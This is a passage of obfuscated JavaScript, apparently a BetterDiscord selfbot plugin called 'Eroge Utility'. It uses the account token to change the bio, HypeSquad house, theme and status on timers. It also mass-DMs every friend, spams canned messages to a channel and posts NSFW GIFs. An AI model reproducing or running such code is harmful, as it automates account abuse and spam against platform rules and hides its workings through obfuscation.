            let mariene = await _0x1ea298[eadyn(1127)].girlSoloGif(), dequesha = (new sherae.RichEmbed)[eadyn(321)](COLOR)[eadyn(1044)](eadyn(372)).setImage(mariene.url).setFooter(eadyn(899), IMAGE);
            dequesha[eadyn(1264)](), jillian[eadyn(407)][eadyn(746)](dequesha);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(883))) {
          jillian.delete(), kahle();
          async function kahle() {
            const estellise = abdrahman;
            let lalisa = await _0x1ea298[estellise(1127)].randomHentaiGif(), bobby = (new sherae[estellise(344)])[estellise(321)](COLOR)[estellise(1044)](estellise(525))[estellise(1211)](lalisa[estellise(1378)])[estellise(938)](estellise(899), IMAGE);
            bobby[estellise(1264)](), jillian[estellise(407)][estellise(746)](bobby);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(422))) {
          jillian.delete(), angharad();
          async function angharad() {
            const lochland = abdrahman;
            let neelan = await _0x1ea298[lochland(1127)][lochland(1479)](), boe = (new sherae[lochland(344)]).setColor(COLOR)[lochland(1044)](lochland(580))[lochland(1211)](neelan[lochland(1378)])[lochland(938)](lochland(899), IMAGE);
            boe[lochland(1264)](), jillian[lochland(407)].send(boe);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(575))) {
          jillian[abdrahman(1289)](), jessa();
          async function jessa() {
            const rhaelynn = abdrahman;
            let preslee = await _0x1ea298[rhaelynn(1127)][rhaelynn(575)](), idriss = (new sherae.RichEmbed)[rhaelynn(321)](COLOR).setTitle(rhaelynn(1102))[rhaelynn(1211)](preslee.url)[rhaelynn(938)](rhaelynn(899), IMAGE);
            idriss.setTimestamp(), jillian[rhaelynn(407)][rhaelynn(746)](idriss);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(370))) {
          jillian[abdrahman(1289)](), crispus();
          async function crispus() {
            const shamauri = abdrahman;
            let endrew = await _0x1ea298[shamauri(1127)].avatar(), andrea = (new sherae[shamauri(344)])[shamauri(321)](COLOR)[shamauri(1044)](shamauri(259))[shamauri(1211)](endrew[shamauri(1378)]).setFooter(shamauri(899), IMAGE);
            andrea[shamauri(1264)](), jillian[shamauri(407)][shamauri(746)](andrea);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1093))) {
          jillian.delete();
          const breania = (new sherae[abdrahman(344)]).setTitle(abdrahman(232) + maithili + abdrahman(878) + maithili + " <<」**")[abdrahman(444)](shadarria[abdrahman(1417)][abdrahman(574)])[abdrahman(457)](abdrahman(649) + maithili + abdrahman(506) + maithili + abdrahman(760))[abdrahman(321)](COLOR)[abdrahman(695)](abdrahman(712) + PREFIX + "hypersquad + NUMBER ```***", abdrahman(401))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1400), "***Change your nikname every 10 seconds***")[abdrahman(695)](abdrahman(712) + PREFIX + "ghostmode ```***", abdrahman(914))[abdrahman(695)](abdrahman(712) + PREFIX + "dmfriends + MSG ```***", "***DM every of your friends and send the message to all***").addField("***```" + PREFIX + abdrahman(512), abdrahman(1176))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1368), abdrahman(1412))[abdrahman(695)](abdrahman(712) + PREFIX + "changebio + TEXT ```***", abdrahman(1443))[abdrahman(695)](abdrahman(712) + PREFIX + "rdmbio ```***", abdrahman(699))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1361), abdrahman(682))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(848), abdrahman(897))[abdrahman(1211)](IMAGE)[abdrahman(938)](abdrahman(899), IMAGE);
          breania[abdrahman(1264)](), jillian[abdrahman(407)][abdrahman(746)](breania), BdApi[abdrahman(1150)]("🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Account commands list sent.", {type: abdrahman(1382)});
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(1035))) {
          let vash = maverick[0];
          jillian.delete();
          if (vash === "1" || vash === "2" || vash === "3") {
            var deelda = {house_id: vash};
            let rodregus = {headers: {"content-type": "application/json", authorization: TOKEN}};
            return _0xd3dae5[abdrahman(386)](abdrahman(405) + aubriana + abdrahman(901), deelda, rodregus), BdApi.showToast(abdrahman(261) + vash + abdrahman(789), {type: abdrahman(1382)});
          } else return BdApi[abdrahman(1150)](abdrahman(1055), {type: "error"});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(884))) {
          let caricia = maverick[0];
          var laudan = jillian.guild;
          jillian[abdrahman(1289)]();
          if (!laudan) return BdApi[abdrahman(1150)]("🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Sorry, you need use this commands in a server.", {type: abdrahman(758)});
          if (caricia === abdrahman(320)) return clearInterval(yanci), yanci = undefined, BdApi[abdrahman(1150)](abdrahman(495), {type: abdrahman(1382)});
          yanci = setInterval(function () {
            const maryori = abdrahman;
            var ishea = RDM_NICKNAME[Math[maryori(250)](Math[maryori(1240)]() * RDM_NICKNAME[maryori(1108)])];
            jillian[maryori(1301)].member(jillian[maryori(887)]).setNickname(ishea);
          }, 6e3), BdApi[abdrahman(1150)](abdrahman(391) + PREFIX + abdrahman(1179), {type: abdrahman(1382)});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1243))) {
          var laudan = jillian[abdrahman(1301)];
          jillian[abdrahman(1289)]();
          if (!laudan) return BdApi[abdrahman(1150)](abdrahman(1299), {type: abdrahman(758)});
          jillian.guild[abdrahman(1197)](jillian.author)[abdrahman(958)]("˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞")[abdrahman(652)](latonio => {}), shadarria[abdrahman(1417)][abdrahman(853)](abdrahman(1247)), BdApi.showToast("🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > You are now in ghostmode.", {type: abdrahman(1382)});
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(630))) {
          let duval = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          jillian[abdrahman(1289)]();
          if (!duval) return BdApi.showToast(abdrahman(1084), {type: abdrahman(758)});
          shadarria.user[abdrahman(340)][abdrahman(1026)](juanetta => {
            const josephus = abdrahman;
            juanetta.send(duval)[josephus(652)](vashtie => {});
          }), BdApi[abdrahman(1150)](abdrahman(1396), {type: abdrahman(1382)});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "setdark")) {
          jillian.delete();
          var deelda = {theme: "dark"};
          let abbot = {headers: {"content-type": "application/json", authorization: TOKEN}};
          _0xd3dae5[abdrahman(1070)](abdrahman(405) + aubriana + abdrahman(891), deelda, abbot)[abdrahman(652)](bhumi => {}), BdApi[abdrahman(1150)]("🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Your theme has been changed to dark.", {type: abdrahman(1382)});
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(416))) {
          jillian[abdrahman(1289)]();
          var deelda = {theme: abdrahman(820)};
          let zykerion = {headers: {"content-type": abdrahman(1254), authorization: TOKEN}};
          _0xd3dae5.patch(abdrahman(405) + aubriana + abdrahman(891), deelda, zykerion)[abdrahman(652)](sadarion => {}), BdApi[abdrahman(1150)](abdrahman(1001), {type: abdrahman(1382)});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(233))) {
          let tessibel = maverick.slice(0)[abdrahman(463)](" ");
          jillian.delete();
          if (!tessibel) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(898));
          var deelda = {bio: tessibel};
          let denekia = {headers: {"content-type": abdrahman(1254), authorization: TOKEN}};
          _0xd3dae5[abdrahman(1070)](abdrahman(405) + aubriana + abdrahman(849), deelda, denekia)[abdrahman(652)](console[abdrahman(1087)](""));
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + "rdmbio")) {
          let lomie = maverick[0];
          jillian[abdrahman(1289)]();
          if (lomie === "stop") return clearInterval(yanci), yanci = undefined, BdApi[abdrahman(1150)](abdrahman(576), {type: abdrahman(1382)});
          yanci = setInterval(function () {
            const zyhir = abdrahman;
            var zisel = RDM_BIO[Math[zyhir(250)](Math[zyhir(1240)]() * RDM_BIO[zyhir(1108)])], smiley = {bio: zisel};
            let kadeja = {headers: {"content-type": "application/json", authorization: TOKEN}};
            _0xd3dae5[zyhir(1070)](zyhir(405) + aubriana + zyhir(849), smiley, kadeja)[zyhir(652)](console.log(""));
          }, 6e4), BdApi[abdrahman(1150)](abdrahman(410) + PREFIX + abdrahman(676), {type: abdrahman(1382)});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1118))) {
          let chrisy = maverick[0];
          jillian[abdrahman(1289)]();
          if (chrisy === abdrahman(320)) return clearInterval(yanci), yanci = undefined, BdApi.showToast("🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Time bio has been stopped.", {type: "info"});
          yanci = setInterval(function () {
            const laretta = abdrahman;
            var hartej = "🕥 " + jaylaun()[laretta(1336)]("MMMM Do YYYY, h:mm:ss a"), myrlee = {bio: hartej};
            let antarious = {headers: {"content-type": laretta(1254), authorization: TOKEN}};
            _0xd3dae5[laretta(1070)](laretta(405) + aubriana + "/users/@me", myrlee, antarious)[laretta(652)](console.log(""));
          }, 6e4), BdApi[abdrahman(1150)](abdrahman(907) + PREFIX + abdrahman(497), {type: abdrahman(1382)});
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(703))) {
          let keoki = maverick[0];
          var laudan = jillian[abdrahman(1301)];
          jillian.delete();
          if (!laudan) return BdApi[abdrahman(1150)](abdrahman(1451), {type: abdrahman(1382)});
          if (keoki === "stop") return clearInterval(yanci), yanci = undefined, BdApi[abdrahman(1150)](abdrahman(352), {type: abdrahman(1382)});
          return yanci = setInterval(function () {
            const sharees = abdrahman;
            var selana = [sharees(685), sharees(998), "Ne fait pas attention a moi", sharees(400), sharees(546)][Math[sharees(250)](Math[sharees(1240)]() * 5)];
            jillian.channel[sharees(746)](selana);
          }, 3e4), BdApi[abdrahman(1150)](abdrahman(491) + PREFIX + abdrahman(1294), {type: abdrahman(1382)});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1090))) {
          jillian[abdrahman(1289)]();
          const eules = (new sherae[abdrahman(344)]).setTitle("**「>> " + maithili + abdrahman(707) + maithili + " <<」**").setThumbnail(shadarria[abdrahman(1417)][abdrahman(574)])[abdrahman(457)]("```      " + maithili + abdrahman(506) + maithili + abdrahman(760))[abdrahman(321)](COLOR)[abdrahman(695)](abdrahman(712) + PREFIX + "streaming + TEXT ```***", abdrahman(646))[abdrahman(695)]("***```" + PREFIX + abdrahman(1049), abdrahman(551))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1153), abdrahman(924))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1193), abdrahman(255))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(743), abdrahman(460))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(691), abdrahman(929))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1421), "***Change your status to hentai img streaming***")[abdrahman(695)](abdrahman(712) + PREFIX + "customstreaming + APP_ID + IMAGE_TEXT + TEXT ```***", abdrahman(641))[abdrahman(695)](abdrahman(712) + PREFIX + "resetstatus ```***", abdrahman(643))[abdrahman(1211)](IMAGE)[abdrahman(938)](abdrahman(899), IMAGE);
          eules.setTimestamp(), jillian.channel.send(eules), BdApi[abdrahman(1150)](abdrahman(1033), {type: abdrahman(1382)});
        }
        jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(607)) && (jillian[abdrahman(1289)](), shadarria[abdrahman(1417)].setPresence({game: {name: "" + maverick[abdrahman(463)](" "), type: abdrahman(309), url: abdrahman(921)}}), BdApi[abdrahman(1150)](abdrahman(426), {type: abdrahman(1382)}));
        jillian.content[abdrahman(1403)](PREFIX + "multistream") && (jillian[abdrahman(1289)](), setInterval(function () {
          const rini = abdrahman;
          shadarria[rini(1417)][rini(1131)](MULTISTREAM[Math[rini(250)](Math[rini(1240)]() * MULTISTREAM[rini(1108)])], {type: rini(309), url: "https://twitch.tv/monstercat"});
        }, 5e3), BdApi[abdrahman(1150)](abdrahman(1303) + PREFIX + abdrahman(1376), {type: "info"}));
        jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1344)) && (shadarria[abdrahman(1417)][abdrahman(851)]({game: {name: abdrahman(1253), type: " ", url: "this"}}), BdApi[abdrahman(1150)](abdrahman(1125), {type: abdrahman(1382)}));
        if (jillian.content.startsWith(PREFIX + abdrahman(540))) {
          var thisbe = abdrahman(1236), jaksen = abdrahman(620);
          let lamarion = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          jillian.delete();
          let tyrihanna = tajmir.createSpotifyRpc(shadarria)[abdrahman(1138)](thisbe)[abdrahman(529)](jaksen).setDetails(lamarion).setState("Eroge plugins")[abdrahman(1457)](Date[abdrahman(783)]()).setEndTimestamp(Date[abdrahman(783)]() + 864e5);
          shadarria[abdrahman(1417)][abdrahman(851)](tyrihanna[abdrahman(234)]()), BdApi.showToast(abdrahman(1415), {type: "info"});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "customspotify")) {
          var thisbe = "", jaksen = "";
          let jauier = 0;
          thisbe = "spotify:" + maverick[0], jaksen = "spotify:" + maverick[1], jauier = maverick[2];
          let kwante = maverick[abdrahman(1063)](3)[abdrahman(463)](" ");
          jillian[abdrahman(1289)]();
          let davario = tajmir[abdrahman(982)](shadarria)[abdrahman(1138)](thisbe)[abdrahman(529)](jaksen).setDetails(kwante)[abdrahman(1245)]("Eroge plugins")[abdrahman(1457)](Date.now())[abdrahman(473)](Date[abdrahman(783)]() + Number(jauier));
          shadarria[abdrahman(1417)].setPresence(davario[abdrahman(234)]()), BdApi[abdrahman(1150)](abdrahman(486), {type: abdrahman(1382)});
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(721))) {
          let jacquee = maverick[0];
          jillian[abdrahman(1289)]();
          if (jacquee === abdrahman(320)) return clearInterval(yanci), yanci = undefined, BdApi.showToast(abdrahman(561), {type: "info"});
          !yanci ? yanci = setInterval(() => {
            const shealene = abdrahman;
            let haytham = new Date;
            var kiondra = haytham[shealene(1362)](shealene(279));
            let jayleanna = {};
            jayleanna.text = kiondra, jayleanna[shealene(1450)] = "🕥";
            let torvi = {headers: {"content-type": "application/json", authorization: TOKEN}};
            _0xd3dae5[shealene(1070)](shealene(405) + aubriana + "/users/@me/settings", JSON[shealene(1174)]({custom_status: jayleanna}), torvi);
          }, 5e3) : BdApi[abdrahman(1150)](abdrahman(587), {type: abdrahman(758)});
          ;
          BdApi[abdrahman(1150)](abdrahman(992) + PREFIX + abdrahman(834), {type: abdrahman(1382)});
        }
        if (keyaira == abdrahman(1159)) {
          let uarda = maverick[0];
          jillian[abdrahman(1289)]();
          uarda === abdrahman(320) && (clearInterval(yanci), yanci = undefined, BdApi[abdrahman(1150)]("🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Media Status has been stopped.", {type: abdrahman(1382)}));
          !yanci ? yanci = setInterval(() => {
            const creig = abdrahman;
            var kymesha = ["🔘▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", creig(464), creig(381), "▬▬▬🔘▬▬▬▬▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "▬▬▬▬🔘▬▬▬▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", creig(723), creig(354), creig(569), creig(492), creig(1260), "▬▬▬▬▬▬▬▬▬▬🔘▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", creig(782), creig(791), creig(840), creig(1038)][Math[creig(250)](Math.random() * 15)];
            let devvon = {};
            devvon[creig(1277)] = kymesha, devvon[creig(1450)] = "🎶";
            let lynia = {headers: {"content-type": creig(1254), authorization: TOKEN}};
            _0xd3dae5[creig(1070)](creig(405) + aubriana + creig(891), JSON[creig(1174)]({custom_status: devvon}), lynia);
          }, 5e3) : BdApi[abdrahman(1150)](abdrahman(587), {type: abdrahman(758)});
          ;
          BdApi[abdrahman(1150)]("🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Media status added do " + PREFIX + abdrahman(1210), {type: abdrahman(1382)});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1373))) {
          jillian[abdrahman(1289)]();
          var cataleah = ["🍁", "🌲", "☄️", "⚡️", "❄️", "🔥", "🌪", "🌸", "🌹", "🍣", "🧃", "🌌", "💊", "💉", "🩸", "🔪", "🧸", "🎀", "❤️", "🔰", "🩹"][Math[abdrahman(250)](Math.random() * 20)], engracia = [abdrahman(793), abdrahman(1183), abdrahman(538), abdrahman(964), abdrahman(523), abdrahman(647), "status7", "status8", "status9", "status10", "status11"][Math[abdrahman(250)](Math[abdrahman(1240)]() * 19)], ursla = () => ([1e7] + -1000 + -4000 + -8000 + -100000000000)["replace"](/[018]/g, morena => (morena ^ Math[abdrahman(1240)]() * 16 >> morena / 4)[abdrahman(1082)](16));
          return tajmir[abdrahman(1473)]("923654116721446912", engracia)[abdrahman(656)](abhijot => {
            const zaleyah = abdrahman;
            let kasimu = (new tajmir[zaleyah(1474)])[zaleyah(1230)](zaleyah(282))[zaleyah(798)](zaleyah(1408))[zaleyah(990)](zaleyah(309))[zaleyah(939)](zaleyah(1006))[zaleyah(1138)](abhijot.id)[zaleyah(1228)]("<3")[zaleyah(917)]("𝙀𝙧𝙤𝙜𝙚 𝙐𝙩𝙞𝙡𝙞𝙩𝙮").setState(zaleyah(1342) + cataleah).setParty({size: [1, 666], id: ursla()});
            shadarria[zaleyah(1417)][zaleyah(851)](kasimu[zaleyah(234)]());
          })[abdrahman(652)](), BdApi[abdrahman(1150)](abdrahman(314), {type: abdrahman(1382)});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(324))) {
          jillian[abdrahman(1289)]();
          let jakyria = maverick[0], alph = maverick[1], laprincia = maverick.slice(2)[abdrahman(463)](" ");
          if (!jakyria) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(353));
          if (!alph) return window.BdApi[abdrahman(1248)](abdrahman(1078), "You need enter a image text from the application ID. ❌");
          if (!laprincia) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(898));
          var cataleah = ["🍁", "🌲", "☄️", "⚡️", "❄️", "🔥", "🌪", "🌸", "🌹", "🍣", "🧃", "🌌", "💊", "💉", "🩸", "🔪", "🧸", "🎀", "❤️", "🔰", "🩹"][Math.floor(Math.random() * 20)], ursla = () => ([1e7] + -1000 + -4000 + -8000 + -100000000000)[abdrahman(738)](/[018]/g, adelise => (adelise ^ Math[abdrahman(1240)]() * 16 >> adelise / 4)[abdrahman(1082)](16));
          return tajmir[abdrahman(1473)](jakyria, alph).then(carrissa => {
            const jahnelle = abdrahman;
            let ahmadou = (new tajmir.Rpc).setName("𝙀𝙧𝙤𝙜𝙚 𝙐𝙩𝙞𝙡𝙞𝙩𝙮").setUrl(jahnelle(757))[jahnelle(990)](jahnelle(309)).setApplicationId(jakyria).setAssetsLargeImage(carrissa.id)[jahnelle(917)](jahnelle(282))[jahnelle(1198)]({size: [1, 666], id: ursla()})[jahnelle(917)](laprincia);
            shadarria[jahnelle(1417)].setPresence(ahmadou[jahnelle(234)]());
          })[abdrahman(652)](console.error), BdApi[abdrahman(1150)](abdrahman(494), {type: abdrahman(1382)});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1184))) return jillian[abdrahman(1289)](), shadarria[abdrahman(1417)][abdrahman(1131)](null, {}), BdApi[abdrahman(1150)](abdrahman(800), {type: "info"});
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(637))) {
          jillian[abdrahman(1289)]();
          const pelagia = (new sherae[abdrahman(344)])[abdrahman(1044)](abdrahman(232) + maithili + abdrahman(1327) + maithili + " <<」**").setThumbnail(shadarria[abdrahman(1417)][abdrahman(574)])[abdrahman(457)](abdrahman(649) + maithili + " 𝙀𝙧𝙤𝙜𝙚 𝙐𝙩𝙞𝙡𝙞𝙩𝙮 " + maithili + abdrahman(760))[abdrahman(321)](COLOR)[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(616), abdrahman(715))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1395), "***Auto reply if someone sends you a invite link in DM***").addField(abdrahman(712) + PREFIX + abdrahman(1089), abdrahman(1364)).addField(abdrahman(712) + PREFIX + abdrahman(434), abdrahman(1023)).addField(abdrahman(712) + PREFIX + "setprefix + TEXT ```***", "***Change the prefix***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(766), abdrahman(1180))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1140), abdrahman(476)).addField(abdrahman(712) + PREFIX + "reload ```***", "***Reload discord***")[abdrahman(695)]("***```" + PREFIX + abdrahman(316), "***Remove every bot that DM you (MEE6, carlbot, YAGPDB)***").addField(abdrahman(712) + PREFIX + "typingdm ```***", abdrahman(796))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(289), abdrahman(1441))[abdrahman(695)](abdrahman(712) + PREFIX + "whitelist + USERID ```***", abdrahman(986)).setImage(IMAGE)[abdrahman(938)](abdrahman(899), IMAGE);
          pelagia[abdrahman(1264)](), jillian[abdrahman(407)][abdrahman(746)](pelagia), BdApi[abdrahman(1150)]("🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Settings commands list sent.", {type: abdrahman(1382)});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(483))) {
          let shawki;
          emiliano[abdrahman(1478)](function (atzhiri, damacio, hageo) {
            const uthman = abdrahman;
            if (atzhiri) return console[uthman(1087)](atzhiri);
            const yuepeng = jaylaun[uthman(672)](shadarria[uthman(671)])[uthman(1336)](" D [days], H [hrs], m [mins], s [secs]"), sayward = (new sherae[uthman(344)])[uthman(367)](shadarria[uthman(1417)][uthman(1423)])[uthman(1044)](uthman(1435)).setColor(COLOR)[uthman(695)](uthman(328), (process.memoryUsage()[uthman(1008)] / 1024 / 1024)[uthman(940)](2) + uthman(644) + (averlee.totalmem() / 1024 / 1024)[uthman(940)](2) + uthman(396), !![])[uthman(695)](uthman(755), "" + yuepeng, !![])[uthman(695)](uthman(236), "" + shadarria[uthman(1417)][uthman(340)][uthman(387)], !![]).addField(uthman(1323), "" + shadarria[uthman(297)].size, !![])[uthman(695)](uthman(418), "" + process.version, !![])[uthman(695)](uthman(1425), uthman(910) + averlee[uthman(1130)]().map(gerin => "" + gerin.model)[0] + uthman(760)).addField(uthman(1178), "`" + damacio[uthman(940)](2) + "%`", !![])[uthman(695)](uthman(285), "`" + averlee[uthman(704)]() + "`", !![])[uthman(695)](uthman(983), "``" + averlee[uthman(814)]() + "``", !![]);
            jillian[uthman(407)].send(sayward);
          });
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1160))) return vyktor === "off" ? (vyktor = "on", jillian[abdrahman(1289)](), window.BdApi.alert(abdrahman(1078), abdrahman(479))) : (vyktor = "off", jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(725)));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "afk")) {
          let laquicha = maverick.slice(0)[abdrahman(463)](" ");
          if (laquicha) return AFK_MESSAGE = laquicha, jillian[abdrahman(1289)](), window.BdApi[abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(673) + laquicha + " ✅");
          return emryk === abdrahman(360) ? (emryk = "on", jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(382)), window[abdrahman(987)].alert("🔪 Eroge Notification 🔪", "If you want to change the AFK message, do /afk (your message). ✅")) : (emryk = "off", jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "AFK mode disabled ❌"));
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "report")) return aidalyn === abdrahman(360) ? (aidalyn = "on", jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(857))) : (aidalyn = "off", jillian.delete(), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(955)));
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(817))) {
          jillian[abdrahman(1289)]();
          let adylee = jillian[abdrahman(393)][abdrahman(1028)](" ")[1];
          if (!adylee) return BdApi[abdrahman(1150)](abdrahman(1e3), {type: abdrahman(758)});
          return PREFIX = adylee, BdApi[abdrahman(1150)]("🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > New prefix has been set:" + PREFIX, {type: abdrahman(1382)});
        }
        if (jillian.content[abdrahman(1403)](PREFIX + "setimage")) {
          jillian[abdrahman(1289)]();
          let lameer = jillian[abdrahman(393)][abdrahman(1028)](" ")[1];
          if (!lameer) return BdApi[abdrahman(1150)](abdrahman(1272), {type: abdrahman(758)});
          return IMAGE = lameer, BdApi[abdrahman(1150)](abdrahman(249) + IMAGE, {type: "success"});
        }
        if (jillian.content[abdrahman(1403)](PREFIX + "setcolor")) {
          jillian[abdrahman(1289)]();
          let cledith = jillian[abdrahman(393)][abdrahman(1028)](" ")[1];
          if (!cledith) return BdApi[abdrahman(1150)](abdrahman(609), {type: "error"});
          return COLOR = cledith, BdApi[abdrahman(1150)](abdrahman(1199) + COLOR, {type: abdrahman(1317)});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(856))) return jillian.delete(), window[abdrahman(424)][abdrahman(856)]();
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(272))) return daralene === abdrahman(360) ? (daralene = "on", jillian.delete(), window[abdrahman(987)].alert(abdrahman(1078), "Remove Bot DM mode enabled. ✅")) : (daralene = "off", jillian.delete(), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(290)));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "typingdm")) return agnessa === "off" ? (agnessa = "on", jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(388))) : (agnessa = abdrahman(360), jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1163)));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(786))) return sajad === abdrahman(360) ? (sajad = "on", jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", "See status mode enabled. ✅")) : (sajad = "off", jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(244)));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "whitelist")) {
          let ariann = maverick[0];
          jillian[abdrahman(1289)]();
          if (!ariann) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(429));
          naadia = ariann, jillian.channel[abdrahman(746)](abdrahman(876) + PREFIX + "help ✅");
        }
      }
      if (jillian.author.id === naadia) {
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(1147))) {
          jillian[abdrahman(1289)]();
          const jendayi = (new sherae[abdrahman(344)]).setTitle(abdrahman(232) + maithili + abdrahman(1345) + maithili + abdrahman(613))[abdrahman(444)](shadarria[abdrahman(1417)][abdrahman(574)])[abdrahman(457)]("```      " + maithili + abdrahman(506) + maithili + abdrahman(760))[abdrahman(321)](COLOR).addField(abdrahman(712) + PREFIX + abdrahman(513), abdrahman(1388))[abdrahman(695)]("***```" + PREFIX + abdrahman(812), abdrahman(535))[abdrahman(1211)](IMAGE)[abdrahman(938)](abdrahman(899), IMAGE);
          jendayi[abdrahman(1264)](), jillian.channel[abdrahman(746)](jendayi);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(443))) {
          jillian[abdrahman(1289)]();
          const jasjeet = (new sherae[abdrahman(344)]).setTitle(abdrahman(232) + maithili + "「𝙈𝙚𝙣𝙪 𝙁𝙪𝙣」" + maithili + abdrahman(613)).setThumbnail(shadarria.user.displayAvatarURL)[abdrahman(457)]("```      " + maithili + abdrahman(506) + maithili + abdrahman(760))[abdrahman(321)](COLOR)[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(752), abdrahman(498))[abdrahman(695)](abdrahman(712) + PREFIX + "trumptweet + TEXT ```***", abdrahman(1471))[abdrahman(695)](abdrahman(712) + PREFIX + "minefont + NUMBER + TEXT ```***", abdrahman(1249)).addField("***```" + PREFIX + abdrahman(383), abdrahman(1187))[abdrahman(695)](abdrahman(712) + PREFIX + "baguette + MENTION ```***", "***Baguette french a members with his avatar***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1447), abdrahman(589))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1462), abdrahman(1449))[abdrahman(695)]("***```" + PREFIX + "changemymind + TEXT ```***", "***Change My Mind with your text***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1404), "***Calculate how much love is possible with this member***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(971), "***Loading for something special ? :o***")[abdrahman(695)]("***```" + PREFIX + abdrahman(465), abdrahman(1200)).addField("***```" + PREFIX + abdrahman(1166), 